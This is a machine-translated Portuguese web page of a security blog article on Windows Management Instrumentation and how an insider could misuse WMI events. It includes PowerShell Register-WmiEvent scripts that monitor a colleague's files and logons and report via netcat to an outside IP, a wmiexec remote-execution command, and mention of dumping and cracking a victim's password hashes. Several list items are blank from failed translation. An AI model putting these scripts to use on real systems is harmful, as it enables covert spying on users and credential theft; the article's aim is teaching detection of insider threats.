<!doctype html>
<html class="no-js" lang="pt">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👨🏿‍🤝‍👨🏻 👼🏽 🔦 Guia da Instrumentação de Gerenciamento do Windows (WMI): Noções básicas sobre ataques WMI 👨🏿‍🍳 💅🏽 🌼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="O Windows Management Instrumentation (WMI) é um subsistema do PowerShell que fornece aos administradores acesso a poderosas ferramentas de monitoramen...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Guia da Instrumentação de Gerenciamento do Windows (WMI): Noções básicas sobre ataques WMI</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/507068/"><img src="https://habrastorage.org/webt/wm/nj/qv/wmnjqvqbgcfcfxcp3omsbeuk4xi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O Windows Management Instrumentation (WMI) é um subsistema do PowerShell que fornece aos administradores acesso a poderosas ferramentas de monitoramento do sistema. Este kit de ferramentas foi concebido como uma ferramenta de administração de sistema rápida e eficaz, mas nem todo mundo o usa para bons propósitos: com sua ajuda, os especialistas podem espionar outros funcionários. O conhecimento dessa vulnerabilidade WMI facilita a detecção e o combate a ameaças internas. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Neste artigo, examinaremos o que são as ferramentas WMI, por que são necessárias e como podem ser usadas para rastrear atividades internas no sistema. Também compilamos um guia mais detalhado sobre eventos WMI e espionagem privilegiada, que você pode </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">baixar gratuitamente.</font></font></a><br>
<a name="habracut"></a><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Breve análise: o que é o WMI e para que serve?</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/0t/au/hp/0tauhpqfa_9fk8xebbdasj4e3je.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Damos um exemplo concreto. </font><font style="vertical-align: inherit;">Usando o WMI, você pode solicitar, por exemplo, todos os arquivos grandes do Excel localizados em um diretório específico e receber uma notificação sempre que criar um arquivo com um determinado tamanho, por exemplo, 1 MB. </font><font style="vertical-align: inherit;">O </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet Register-WmiEvent</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> permite fazer tudo isso com uma única linha não muito complicada no PowerShell. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em boas mãos, o WMI pode servir a muitos propósitos, mas também pode se tornar uma ferramenta para atividades internas maliciosas. </font><font style="vertical-align: inherit;">Você pode facilmente imaginar como uma pessoa com os hábitos de Edward Snowden usa o WMI para espionar seus colegas. </font><font style="vertical-align: inherit;">Para fazer isso, ele nem precisa de conhecimento técnico especial.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Suponha que nosso insider hipotético "acidentalmente" tenha espionado que seu colega Lex baixe periodicamente grandes arquivos do Excel contendo números de previdência social e outros dados pessoais de clientes. </font><font style="vertical-align: inherit;">Nesse caso, nossa pessoa discreta pode criar algo assim:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance isa 'CIM_DataFile' and TargetInstance.FileSize &gt; 2000000 and TargetInstance.Path = '\\Users\\lex\\Important' and targetInstance.Drive = 'C:’ and targetInstance.Extension =’xlsx’” -Action $action </code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Este código consulta o objeto </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CIM_DataFile</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> para acessar informações sobre como criar o arquivo do Excel no diretório especificado e, em seguida, inicia a execução do bloco de scripts. </font><font style="vertical-align: inherit;">No final deste artigo, examinaremos mais detalhadamente como esse bloco de cenário pode parecer no caso de nosso insider hipotético.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Para que é usado o Kit de Ferramentas de Gerenciamento do Windows?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Antes de começarmos a explorar como o WMI pode ser usado por pessoas de dentro para fins de rastreamento, vale a pena notar que ele tem muitos usos legítimos. </font><font style="vertical-align: inherit;">O objetivo global deste sistema é reunir todos os controles para dispositivos e aplicativos em redes corporativas. </font><font style="vertical-align: inherit;">Assim, o WMI pode ser usado:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> coletar informações sobre o status de sistemas de computadores locais e remotos </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">configurações de segurança para computadores e aplicativos remotos</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">configurando e editando propriedades do sistema</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">definindo e editando permissões para usuários e grupos autorizados</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">execução de código e serialização de objetos (uma </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">espécie de "SSH em esteróides"</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">atribuir e editar etiquetas da unidade</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">criando um cronograma de processo</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">repositórios de objetos de backup</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ativar e desativar o log de erros</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Todos esses recursos podem ser acessados ​​usando o PowerShell e o WMIC, a interface da linha de comandos do WMI. </font><font style="vertical-align: inherit;">Como você pode ver, o WMI possui uma ampla variedade de aplicativos, e esse sistema permite rastrear e editar muitos parâmetros diferentes em uma rede de computadores.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Arquitetura de instrumentação de gerenciamento do Windows</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/2w/tf/ij/2wtfijgpvxpx9nijaapuk9a74gg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O kit de ferramentas WMI faz parte do sistema operacional Windows e é pré-instalado em todos os sistemas operacionais iniciados no Windows 2000. O WMI consiste nos seguintes componentes:</font></font><br>
<br>
<ul>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O serviço WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> é uma implementação do sistema WMI no Windows. </font><font style="vertical-align: inherit;">Esse processo aparece sob o nome "Windows Management Instrumentation" e é o link entre os provedores WMI, o repositório WMI e os aplicativos de gerenciamento. </font><font style="vertical-align: inherit;">Esse processo inicia automaticamente quando você liga o computador.</font></font></li>
<li><strong> </strong> —        ,      WMI.        ,  WMI        ,       Windows,    .</li>
<li><strong> WMI </strong> —  ,       .      WMI   ,      .        Windows.</li>
<li><strong> </strong>  WMI     WMI.      ,     .   WMI       .</li>
<li><strong></strong>,     ,         . ,           .              .</li>
<li><strong> WMI</strong> —   ,      ,   WMI.      .         WMI.</li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O gerenciador de objetos CMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> é um sistema que fica entre o aplicativo de gerenciamento e os provedores WMI. </font><font style="vertical-align: inherit;">Ela solicita dados desses provedores e os transfere para o aplicativo.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A API WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> executa essas operações e fornece aos aplicativos acesso à infraestrutura WMI sem estar vinculada ao tipo de dispositivo usado.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Um consumidor WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> é uma entidade que envia solicitações para objetos através do gerenciador de objetos. </font><font style="vertical-align: inherit;">Normalmente, um consumidor WMI é um aplicativo de monitoramento, como o PRTG Network Monitor, executando o aplicativo ou um script do PowerShell.</font></font></li>
</ul><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fazendo solicitações WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A maneira mais fácil de executar uma solicitação WMI é executar o WMIC em uma linha de comando padrão do Windows. </font><font style="vertical-align: inherit;">Siga estas etapas para obter informações sobre o processador usado no computador local:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Abrir prompt de comando</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Digite WMIC para chamar o programa e pressione Enter </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A janela do prompt de comando do WMIC será exibida.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">No prompt de comando, você pode executar solicitações WMI. </font><font style="vertical-align: inherit;">A solicitação mais simples é visualizar informações sobre o processador local, que podem ser executadas usando o seguinte comando:</font></font><br>
<pre><code class="plaintext hljs">WMIC CPU</code></pre><br>
</li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Os resultados serão exibidos na linha de comando.</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Quase todos os comandos que serão discutidos abaixo são executados dessa maneira. </font><font style="vertical-align: inherit;">No entanto, o WMI permite que você receba informações muito mais detalhadas que as informações do processador, inclusive de computadores e aplicativos remotos.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Workshop sobre o uso de eventos WMI para monitorar um sistema</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nesta seção, veremos como usar o WMI para executar comandos e monitorar processos em computadores remotos. </font><font style="vertical-align: inherit;">Essas técnicas podem ser usadas como parte </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">do sistema de análise de comportamento do usuário e da entidade (UEBA)</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> para monitorar automaticamente os processos em todo o sistema e </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">verificar ameaças </font></font></a><font style="vertical-align: inherit;"><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;">internas</font></a><font style="vertical-align: inherit;"> , evidenciadas por comportamentos suspeitos ou eventos anormais.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Usando a funcionalidade wmiexec do Impacket</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No WMI, você pode executar várias funções além do gerenciamento de eventos. Nele, você pode iniciar processos e executar comandos nas janelas do Windows em computadores locais e remotos. Por diversão, tente digitar o </font><font style="vertical-align: inherit;">comando </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> process call create 'notepad.exe' em uma sessão do PowerShell para abrir o antigo editor de texto da Microsoft. Ele usa a maravilhosa ferramenta de linha de comando wmic incluída no WMI. Ótimo, certo? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se eu adicionasse a opção / Node: e, em seguida, o nome do computador Windows remoto, eu poderia executar o Bloco de Notas nele, desde que eu tenha as permissões apropriadas. É claro que, em nível prático, o wmic é uma ferramenta indispensável para os administradores de sistemas.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Antes de começar a se ressentir: eu sei que existem </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlets</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> equivalentes do </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;">PowerShell</font></a><font style="vertical-align: inherit;"> . No entanto, acho a sintaxe wmic mais fácil de lembrar. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seria ótimo se eu pudesse usar o WMI para criar um pseudo-shell simples e invisível.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/gu/nl/1j/gunl1jzoplcyeo2axlgjwd6bifw.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Um pseudo-shell oculto criado com o wmiexec. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para minha sorte, isso pode ser feito no Impacket. No ambiente de teste da Amazon, usei meu </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmiexec</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> favorito </font><font style="vertical-align: inherit;">para acessar o WMI através da máquina virtual Linux. O Wmiexec fornece a capacidade de criar um pseudo-shell: cada vez que um comando é inserido no lado do cliente, um shell separado é criado no computador de destino para executar esse comando. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O psexec e o smbexec usam os serviços do Windows para executar comandos em um sistema remoto. O Smbexec é executado silenciosamente, pois cria e exclui rapidamente o serviço, e o psexec, pelo contrário, o deixa à vista.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/vk/mb/ik/vkmbiktrjf4cn49ihyxvhp12u0w.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 A ferramenta wmiexec executa diretamente o cmd.exe para executar o comando remotamente. </font><font style="vertical-align: inherit;">O comando criado pode ser encontrado no visualizador de eventos. </font><font style="vertical-align: inherit;">Observe que evitamos os serviços </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
atraentes do Windows.A ferramenta wmiexec não afeta os serviços, em vez disso, use os recursos WMI descritos acima para iniciar o processo diretamente. </font><font style="vertical-align: inherit;">Ao procurar possíveis fontes de ameaças, os especialistas em segurança raramente começam com o WMI, enquanto os serviços geralmente são um bom lugar para começar a procurar evidências de um ataque. </font><font style="vertical-align: inherit;">Boa jogada, wmiexec!</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Usando eventos WMI para monitorar usuários</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Enquanto eu me divertia com o pensamento de que era tão inteligente e experimentava o WMI, os caras envolvidos nos testes de penetração haviam entendido há muito tempo como tudo funcionava. Você definitivamente precisa ler </font><font style="vertical-align: inherit;">a </font><font style="vertical-align: inherit;">incrível </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apresentação</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> de Matt Graeber da conferência Black Hat de 2015, onde ele fala sobre como os invasores podem transformar o WMI e todo o seu arsenal de eventos em uma ferramenta de hackers. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Na minha história, imagino um interno a la Snowden que tenha algum conhecimento técnico, mas não tenha profunda sabedoria em hackers, e que tenha a confiança de outros funcionários. Essa pessoa não precisa saber tudo sobre o WMI. Ele precisa saber apenas o que é necessário para trabalhar em um computador remoto e acionar eventos.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Além dos objetos de arquivo, há outra classe interessante de objetos que pode ser aprendida usando o WMI, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">win32_LogOnSession</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Consultar este objeto básico do Windows permite encontrar os usuários que estão atualmente no sistema. Você pode usar o bloco de script de ação Register-WmiEvent para executar o script do PowerShell quando um novo usuário fizer logon remotamente. Entendeu? Um invasor pode receber notificações sempre que um usuário que ele monitora efetua login no sistema de destino. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqui está o que eu esbocei:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" –Action $action</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A próxima pergunta é como programar a execução de um bloco de scripts. Um membro misterioso das minhas fantasias está interessado em um usuário específico - Cruell. Nosso vilão estava lentamente espionando Cruella e agora planeja usar as informações coletadas para quebrar sua conta de trabalho. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A tarefa do bloco de scripts é verificar quem está conectado e determinar se foi Cruella. Escrevi algumas linhas do código do PowerShell para esse fim, mas claramente essa não é a melhor maneira. Não uso as informações do evento transmitidas ao bloco de scripts, ou seja, as informações sobre o novo usuário. Eu topo com obstáculos, as razões pelas quais eu não consigo entender no momento. Isso requer mais conhecimento técnico do que nosso insider hipotético tem ou está pronto para adquirir.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em vez disso, simplesmente examinei a lista de usuários retornados pelo gwmi Win32_Process (tente executar esse cmdlet em uma sessão do PowerShell) e os combinei com o parâmetro Cruell. </font><font style="vertical-align: inherit;">Você pode admirar minha decisão final:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {<font></font>
<font></font>
$names=gwmi Win32_Process|% { $_.GetOwner().User}<font></font>
foreach ($user in $names){<font></font>
<font></font>
    if ($user -eq "cruella") {<font></font>
<font></font>
        echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80<font></font>
    }<font></font>
}<font></font>
<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O Register-WmiEvent permite que você mantenha a furtividade, pois só é iniciado quando você efetua login novamente, em vez de solicitar regularmente o objeto Win32_Process, o que pode ser bastante perceptível. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lembre-se de que nosso insider tenta não atrair atenção. </font><font style="vertical-align: inherit;">Ela tem acesso ao sistema remoto através de psexec, smbexec ou wmiexec (a maneira mais discreta). </font><font style="vertical-align: inherit;">No entanto, ela não precisa andar constantemente de um lado para o outro no sistema da vítima. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Essa é a beleza de usar eventos WMI. </font><font style="vertical-align: inherit;">Você pode aguardar a notificação do Register-WmiEvent e, calmamente, fazer sua jogada.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Integração Netcat e WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mas como o script traz as notícias quentes de que o Cruella está conectado ao computador de destino? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se você perceber que eu usei os comandos Netcat acima, você pode se dar uma vantagem. </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O Netcat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> é um utilitário conhecido e universal que permite estabelecer conexões (opcional para malware). Com ele, você pode realizar uma conexão reversa ou simplesmente enviar mensagens pela rede. Aproveitei esta segunda oportunidade. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O script acima envia uma mensagem Netcat no modo de espera e exibe "Cruella logado". Missão cumprida. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Você pode imaginar como nosso scammer despeja hashes com a </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ferramenta Impacket secretsdump</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, decifre o hash das credenciais Cruella e inicie o wmiexec, usando as permissões Cruella, para procurar dados mais valiosos.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ca/en/ni/caennizhyw6u4_yuldedujkbowa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 O código Register-WmiEvent pode ser executado diretamente. </font><font style="vertical-align: inherit;">Preste atenção ao identificador de evento exibido</font></font><br>
 <br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Solucionando problemas de monitoramento WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como parte deste exemplo, eu queria executar remotamente (usando o wmiexec) um programa útil que me alertaria quando um usuário específico, ou seja, Cruella, fizer login. Depois disso, eu poderia redefinir e quebrar suas credenciais com segurança. Essa seria a maneira mais discreta - acesso remoto e nenhum arquivo. O único problema, me pareceu a princípio, era a natureza temporária dos eventos do WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Portanto, eu precisava incluir meu Register-WMIEvent longo obsceno (abaixo) na linha de comando do PowerShell com o parâmetro –noexit, o que garante que a sessão do PowerShell seja salva após o Register-Event e, portanto, o evento será salvo.</font></font><br>
<br>
<pre><code class="plaintext hljs"> Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {$names=gwmi Win32_Process|% { $_.GetOwner().User};foreach ($user in $names){if ($user -eq "cruella") {echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80}}}
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Quando comecei a trabalhar nisso, percebi que tinha que "converter" caracteres especiais como $ "e | e passá-los como literais diretamente para o PowerShell. </font><font style="vertical-align: inherit;">Outra dor de cabeça: acabei tendo que abandonar o uso de linhas verticais porque causavam erros de análise. </font><font style="vertical-align: inherit;">Não pergunte. </font><font style="vertical-align: inherit;">Gradualmente, cheguei a esta longa linha de código:</font></font><br>
<br>
<pre><code class="plaintext hljs">$command="powershell -noexit -C Register-WMIEvent -Query ""Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3"" -Action {`$names = gwmi Win32_Process; `$users=@(); foreach (`$n in `$names) {`$users += `$n.GetOwner().User}; foreach (`$u in `$users) {if (`$u -eq ""cruella"") {.\wmiexec C:\Users\lex\Documents\nc.exe 172.31.18.92 80 }}}<font></font>
.\wmiexec.exe corp.acme/lex@172.31.46.115 "$command"<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Parecia promissor e parecia funcionar corretamente de acordo com o log de eventos do Windows no sistema de destino. </font><font style="vertical-align: inherit;">No entanto, olhando mais de perto, percebi que não funciona. </font><font style="vertical-align: inherit;">Estou certo de que, no final, eu poderia trazê-lo para a forma correta, mas para isso eu precisaria de tempo e café, muito café. </font><font style="vertical-align: inherit;">Há outra opção, um pouco menos discreta e sem arquivo: você pode usar o smbclient para transferir o script e executá-lo diretamente no computador de destino.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/qo/vq/jc/qovqjcy0lqzkf5v3bvaxglub5eu.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 A execução remota do complexo cmdlet Register-Event me pareceu absolutamente correta. </font><font style="vertical-align: inherit;">Mas não funcionou. </font><font style="vertical-align: inherit;">Bem </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
. Infelizmente, nesta fase, minhas suposições de que um especialista inteligente, mas não muito experiente, poderia facilmente usar eventos temporários WMI para vigilância secreta começaram a desmoronar.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Por que eventos constantes devem ser usados ​​para observação? </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O correto e, ao mesmo tempo, exigindo um conhecimento mais aprofundado é usar eventos WMI persistentes. Eventos WMI permanentes, embora com alguma complexidade, não são apenas uma ferramenta mais eficaz para espiões internos do que eventos temporários, mas também permitem monitorar de forma mais eficaz as ameaças internas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O estudo de eventos persistentes levará algum tempo, mas eles representam a maneira mais eficaz de implementar um sistema de monitoramento rigoroso para sistemas grandes. Eles têm mais recursos do que eventos WMI temporários. Eles também podem ser usados ​​para alertá-lo sobre atividades maliciosas não padrão, como encapsulamento de DNS ou violações da política de </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Confiança Zero.</font></font></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Passei alguns dias estudando eventos persistentes e descobri que o PowerShell tem um cmdlet especial que simplifica o processo de criação de um filtro de eventos, um consumidor e objetos WMI entre o filtro e o consumidor. Como todos sabemos, o PowerShell oferece aos administradores amplas oportunidades para simplificar seu trabalho. Infelizmente, este exemplo mostra como os invasores podem tirar proveito desses ótimos recursos. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
